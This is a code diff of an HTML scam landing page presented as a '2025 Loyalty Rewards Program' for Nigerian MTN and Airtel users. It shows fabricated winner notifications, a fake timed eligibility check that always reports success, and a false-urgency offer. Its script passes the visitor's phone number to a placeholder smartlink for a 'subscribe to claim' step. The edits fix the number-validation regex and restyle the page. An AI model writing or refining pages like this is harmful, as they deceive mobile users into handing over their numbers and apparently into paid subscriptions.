@@ -1,318 +1,300 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>2025 Loyalty Rewards Program</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #111;
-      color: #eee;
-      margin: 0;
-      padding: 0;
-    }
-    /* ===== Testimonial Pop-Down ===== */
-    .testimonial-pop {
-      position: fixed;
-      top: -150px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: linear-gradient(135deg, #ff4b2b, #ff416c);
-      color: #fff;
-      padding: 15px 20px;
-      border-radius: 12px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.4);
-      display: flex;
-      align-items: center;
-      gap: 15px;
-      width: 90%;
-      max-width: 400px;
-      transition: top 0.6s ease;
-      z-index: 2000;
-    }
-    .testimonial-pop.show {
-      top: 20px;
-    }
-    .testimonial-icon {
-      font-size: 28px;
-    }
-    .testimonial-text {
-      flex: 1;
-    }
-    .testimonial-text strong {
-      display: block;
-      font-size: 16px;
-      margin-bottom: 3px;
-    }
-    .testimonial-time {
-      font-size: 12px;
-      opacity: 0.8;
-      margin-top: 4px;
-    }
-    /* ===== Page styles ===== */
-    .container {
-      max-width: 500px;
-      margin: 40px auto;
-      background: #1b1b1b;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 20px rgba(255,0,0,0.2);
-    }
-    .header {
-      text-align: center;
-    }
-    .header h1 {
-      color: #ff4444;
-      margin-bottom: 10px;
-      font-size: 24px;
-    }
-    .header p {
-      font-size: 14px;
-      line-height: 1.5;
-      color: #ccc;
-    }
-    .image-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
-      margin: 20px 0;
-    }
-    .image-grid img {
-      width: 100%;
-      aspect-ratio: 1 / 1;
-      object-fit: cover;
-      border-radius: 8px;
-      border: 2px solid #333;
-    }
-    .below-image-text {
-      text-align: center;
-      margin-bottom: 20px;
-      font-size: 14px;
-      color: #ccc;
-    }
-    .form-group {
-      margin-top: 10px;
-    }
-    input[type="tel"] {
-      width: 100%;
-      padding: 12px;
-      font-size: 16px;
-      border: 1px solid #444;
-      border-radius: 5px;
-      background: #222;
-      color: #fff;
-    }
-    button {
-      margin-top: 15px;
-      width: 100%;
-      padding: 12px;
-      background: #ff4444;
-      border: none;
-      color: white;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    .loading-screen {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.95);
-      z-index: 1000;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-    }
-    .loader {
-      border: 8px solid #333;
-      border-top: 8px solid #ff4444;
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    .loading-text {
-      font-size: 16px;
-      color: #ccc;
-      text-align: center;
-      line-height: 1.5;
-    }
-    .popup {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(0, 0, 0, 0.95);
-      color: #fff;
-      z-index: 999;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-    }
-    .popup-box {
-      background: #1e1e1e;
-      padding: 25px;
-      border-radius: 10px;
-      max-width: 360px;
-      width: 100%;
-      text-align: center;
-      box-shadow: 0 0 12px rgba(255, 0, 0, 0.2);
-    }
-    .popup-box h2 {
-      color: #ff4444;
-    }
-    .popup-box p {
-      font-size: 15px;
-      line-height: 1.5;
-    }
-    .popup-box button {
-      background: #25d366;
-    }
-    .popup-box small {
-      display: block;
-      margin-top: 10px;
-      font-size: 12px;
-      color: #aaa;
-    }
-    .footer {
-      font-size: 12px;
-      color: #666;
-      margin-top: 20px;
-      text-align: center;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>2025 Loyalty Rewards Program</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #0d0d0d;
+    color: #eee;
+    margin: 0;
+    padding: 0;
+  }
+
+  /* ===== Testimonial Pop-Down ===== */
+  .testimonial-pop {
+    position: fixed;
+    top: -200px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: linear-gradient(135deg, #ff4444, #ff6a3d);
+    color: #fff;
+    padding: 15px 25px;
+    border-radius: 15px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    width: 90%;
+    max-width: 550px;
+    transition: top 0.6s ease;
+    z-index: 2000;
+  }
+  .testimonial-pop.show { top: 20px; }
+  .testimonial-icon { font-size: 32px; }
+  .testimonial-text { flex: 1; }
+  .testimonial-text strong {
+    display: block;
+    font-size: 18px;
+    margin-bottom: 5px;
+  }
+  .testimonial-time {
+    font-size: 13px;
+    opacity: 0.85;
+    margin-top: 4px;
+  }
+
+  /* ===== Container ===== */
+  .container {
+    max-width: 550px;
+    margin: 60px auto;
+    background: #161616;
+    padding: 35px;
+    border-radius: 12px;
+    box-shadow: 0 0 25px rgba(255,0,0,0.25);
+  }
+  .header { text-align: center; }
+  .header h1 {
+    color: #ff4444;
+    margin-bottom: 12px;
+    font-size: 26px;
+  }
+  .header p {
+    font-size: 15px;
+    line-height: 1.5;
+    color: #ccc;
+  }
+
+  /* ===== Images ===== */
+  .image-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin: 20px 0;
+  }
+  .image-grid img {
+    width: 100%;
+    aspect-ratio: 1 / 1;
+    object-fit: cover;
+    border-radius: 10px;
+    border: 2px solid #2a2a2a;
+  }
+
+  .below-image-text {
+    text-align: center;
+    margin-bottom: 18px;
+    font-size: 15px;
+    color: #ccc;
+  }
+
+  /* ===== Form ===== */
+  .form-group { margin-top: 10px; }
+  input[type="tel"] {
+    width: 100%;
+    padding: 14px;
+    font-size: 16px;
+    border: 1px solid #444;
+    border-radius: 6px;
+    background: #222;
+    color: #fff;
+  }
+  button {
+    margin-top: 15px;
+    width: 100%;
+    padding: 14px;
+    background: linear-gradient(135deg, #ff4444, #ff6a3d);
+    border: none;
+    color: white;
+    font-size: 17px;
+    font-weight: bold;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: transform 0.2s ease;
+  }
+  button:hover { transform: scale(1.03); }
+
+  /* ===== Loading ===== */
+  .loading-screen {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background-color: rgba(0, 0, 0, 0.96);
+    z-index: 1000;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+  }
+  .loader {
+    border: 8px solid #333;
+    border-top: 8px solid #ff4444;
+    border-radius: 50%;
+    width: 65px; height: 65px;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  .loading-text { font-size: 16px; color: #ccc; text-align: center; line-height: 1.5; }
+
+  /* ===== Popup ===== */
+  .popup {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0, 0, 0, 0.96);
+    color: #fff;
+    z-index: 999;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .popup-box {
+    background: #1f1f1f;
+    padding: 25px;
+    border-radius: 12px;
+    max-width: 370px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 0 12px rgba(255, 0, 0, 0.3);
+  }
+  .popup-box h2 { color: #ff4444; }
+  .popup-box p { font-size: 15px; line-height: 1.5; }
+  .popup-box button {
+    background: #25d366;
+    font-weight: bold;
+  }
+  .popup-box small {
+    display: block;
+    margin-top: 10px;
+    font-size: 12px;
+    color: #aaa;
+  }
+
+  /* Footer */
+  .footer {
+    font-size: 12px;
+    color: #666;
+    margin-top: 20px;
+    text-align: center;
+  }
+</style>
 </head>
 <body>
-  <!-- Testimonial Pop-Down -->
-  <div class="testimonial-pop" id="testimonialPop">
-    <div class="testimonial-icon">🎉</div>
-    <div class="testimonial-text">
-      <strong>New Winner!</strong>
-      <span id="testimonialMessage">James from Lagos just won ₦5,000,000!</span>
-      <div class="testimonial-time" id="testimonialTime">2 minutes ago</div>
-    </div>
+
+<!-- Testimonial Pop-Down -->
+<div class="testimonial-pop" id="testimonialPop">
+  <div class="testimonial-icon">🎉</div>
+  <div class="testimonial-text">
+    <strong>New Winner!</strong>
+    <span id="testimonialMessage">James from Lagos just won ₦5,000,000!</span>
+    <div class="testimonial-time" id="testimonialTime">2 minutes ago</div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="header">
+    <h1>2025 Loyalty Rewards Program</h1>
+    <p>As part of our 2025 Customer Rewards Program, selected users may be eligible to receive a free iPhone 14 Pro Max, ₦5,000,000 cash prize or unlimited data bundle.</p>
   </div>
 
-  <div class="container">
-    <div class="header">
-      <h1>2025 Loyalty Rewards Program</h1>
-      <p>
-        As part of our 2025 Customer Rewards Program, selected users may be eligible to receive a free iPhone 14 Pro Max, ₦5,000,000 cash prize or unlimited data bundle.
-      </p>
-    </div>
-
-    <div class="image-grid">
-      <img src="https://i.postimg.cc/vmpk9fRZ/images-2-8.jpg" alt="iPhone Giveaway" />
-      <img src="https://i.postimg.cc/XqWP1WYM/images-2-10.jpg" alt="₦5 Million Cash Prize" />
-      <img src="https://i.postimg.cc/j5nKYRTL/images-2-11.jpg" alt="Car Giveaway" />
-      <img src="https://i.postimg.cc/h4p4WVC6/Screenshot-20250731-071855.jpg" alt="Unlimited Data" />
-    </div>
-
-    <div class="below-image-text">
-      Enter your mobile number below to check if you're qualified
-    </div>
-
-    <div class="form-group">
-      <input type="tel" id="msisdn" placeholder="Enter your MTN or Airtel number" />
-      <button onclick="startCheck()">Check Eligibility</button>
-    </div>
-
-    <div class="footer">
-      Only MTN and Airtel users are eligible. Terms & Conditions apply.
-    </div>
+  <div class="image-grid">
+    <img src="https://i.postimg.cc/vmpk9fRZ/images-2-8.jpg" alt="iPhone Giveaway" />
+    <img src="https://i.postimg.cc/XqWP1WYM/images-2-10.jpg" alt="₦5 Million Cash Prize" />
+    <img src="https://i.postimg.cc/j5nKYRTL/images-2-11.jpg" alt="Car Giveaway" />
+    <img src="https://i.postimg.cc/h4p4WVC6/Screenshot-20250731-071855.jpg" alt="Unlimited Data" />
   </div>
 
-  <div class="loading-screen" id="loading">
-    <div class="loader"></div>
-    <div class="loading-text" id="loadingMessage">Checking eligibility...</div>
+  <div class="below-image-text">Enter your mobile number below to check if you're qualified</div>
+
+  <div class="form-group">
+    <input type="tel" id="msisdn" placeholder="Enter your MTN or Airtel number" />
+    <button onclick="startCheck()">Check Eligibility</button>
   </div>
 
-  <div class="popup" id="result">
-    <div class="popup-box">
-      <h2>Sorry</h2>
-      <p>You didn't qualify for an iPhone giveaway.<br><br>
-         But you qualify for a <strong>₦5 million naira giveaway</strong>!<br>
-         Offer expires in <strong>3 hours</strong>.</p>
-      <button onclick="redirectToOffer()">Subscribe to Claim Now</button>
-      <small>Your mobile number is required</small>
-    </div>
+  <div class="footer">Only MTN and Airtel users are eligible. Terms & Conditions apply.</div>
+</div>
+
+<div class="loading-screen" id="loading">
+  <div class="loader"></div>
+  <div class="loading-text" id="loadingMessage">Checking eligibility...</div>
+</div>
+
+<div class="popup" id="result">
+  <div class="popup-box">
+    <h2>Sorry</h2>
+    <p>You didn't qualify for an iPhone giveaway.<br><br>
+       But you qualify for a <strong>₦5 million naira giveaway</strong>!<br>
+       Offer expires in <strong>3 hours</strong>.</p>
+    <button onclick="redirectToOffer()">Subscribe to Claim Now</button>
+    <small>Your mobile number is required</small>
   </div>
+</div>
 
-  <script>
-    function startCheck() {
-      const number = document.getElementById('msisdn').value;
-      if (!/^0[789][01]\\d{8}$/.test(number)) {
-        alert('Please enter a valid 11-digit Nigerian number');
-        return;
-      }
-      document.getElementById('loading').style.display = 'flex';
+<script>
+function startCheck() {
+  const number = document.getElementById('msisdn').value.trim();
+  if (!/^0[789][01]\d{8}$/.test(number)) { // FIXED regex
+    alert('Please enter a valid 11-digit Nigerian number');
+    return;
+  }
+  document.getElementById('loading').style.display = 'flex';
 
-      const messages = [
-        "Checking eligibility...",
-        "Verifying mobile number...",
-        "",
-        "Almost done...",
-        "You qualified!"
-      ];
+  const messages = [
+    "Checking eligibility...",
+    "Verifying mobile number...",
+    "Contacting network provider...",
+    "Almost done...",
+    "You qualified!"
+  ];
 
-      let index = 0;
-      const interval = setInterval(() => {
-        if (messages[index]) {
-          document.getElementById("loadingMessage").innerText = messages[index];
-        }
-        index++;
-        if (index >= messages.length) clearInterval(interval);
-      }, 1800);
-
-      setTimeout(() => {
-        document.getElementById('loading').style.display = 'none';
-        document.getElementById('result').style.display = 'flex';
-      }, 9000);
+  let index = 0;
+  const interval = setInterval(() => {
+    if (messages[index]) {
+      document.getElementById("loadingMessage").innerText = messages[index];
     }
+    index++;
+    if (index >= messages.length) clearInterval(interval);
+  }, 1800);
 
-    function redirectToOffer() {
-      const number = document.getElementById('msisdn').value;
-      window.location.href = `https://your-smartlink.com/?msisdn=${number}`;
-    }
+  setTimeout(() => {
+    document.getElementById('loading').style.display = 'none';
+    document.getElementById('result').style.display = 'flex';
+  }, 9000);
+}
 
-    // ===== Testimonial Rotation Logic =====
-    const testimonials = [
-      { msg: "James from Lagos just won ₦5,000,000!", time: "2 minutes ago" },
-      { msg: "Ada from Abuja got a brand new iPhone 14 Pro Max!", time: "5 minutes ago" },
-      { msg: "Michael from Port Harcourt received unlimited data for 1 year!", time: "7 minutes ago" }
-    ];
+function redirectToOffer() {
+  const number = document.getElementById('msisdn').value.trim();
+  window.location.href = `https://your-smartlink.com/?msisdn=${number}`;
+}
 
-    let tIndex = 0;
-    const testimonialPop = document.getElementById('testimonialPop');
-    const testimonialMessage = document.getElementById('testimonialMessage');
-    const testimonialTime = document.getElementById('testimonialTime');
+// ===== Testimonial Rotation =====
+const testimonials = [
+  { msg: "James from Lagos just won ₦5,000,000!", time: "2 minutes ago" },
+  { msg: "Ada from Abuja got a brand new iPhone 14 Pro Max!", time: "5 minutes ago" },
+  { msg: "Michael from Port Harcourt received unlimited data for 1 year!", time: "7 minutes ago" }
+];
+let tIndex = 0;
+const testimonialPop = document.getElementById('testimonialPop');
+const testimonialMessage = document.getElementById('testimonialMessage');
+const testimonialTime = document.getElementById('testimonialTime');
 
-    function showTestimonial() {
-      const t = testimonials[tIndex];
-      testimonialMessage.textContent = t.msg;
-      testimonialTime.textContent = t.time;
-      testimonialPop.classList.add('show');
+function showTestimonial() {
+  const t = testimonials[tIndex];
+  testimonialMessage.textContent = t.msg;
+  testimonialTime.textContent = t.time;
+  testimonialPop.classList.add('show');
 
-      setTimeout(() => {
-        testimonialPop.classList.remove('show');
-      }, 4000); // Visible for 4s
+  setTimeout(() => {
+    testimonialPop.classList.remove('show');
+  }, 4000);
 
-      tIndex = (tIndex + 1) % testimonials.length;
-    }
+  tIndex = (tIndex + 1) % testimonials.length;
+}
+setInterval(showTestimonial, 7000);
+setTimeout(showTestimonial, 2000);
+</script>
 
-    setInterval(showTestimonial, 7000); // New testimonial every 7s
-    setTimeout(showTestimonial, 2000); // First one after 2s
-  </script>
 </body>
 </html>
